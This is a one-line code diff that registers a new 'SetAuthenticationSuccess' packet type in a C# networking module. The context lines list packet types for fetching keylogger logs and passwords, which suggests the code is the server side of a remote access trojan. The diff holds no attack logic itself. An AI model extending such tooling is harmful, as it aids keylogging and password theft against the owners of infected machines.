@@ -153,6 +153,7 @@ namespace xServer.Core.Networking
                 typeof (Packets.ServerPackets.GetKeyloggerLogs),
                 typeof (Packets.ServerPackets.DoUploadFile),
                 typeof (Packets.ServerPackets.GetPasswords),
+                typeof (Packets.ServerPackets.SetAuthenticationSuccess),
                 typeof (Packets.ClientPackets.GetAuthenticationResponse),
                 typeof (Packets.ClientPackets.SetStatus),
                 typeof (Packets.ClientPackets.SetStatusFileManager),
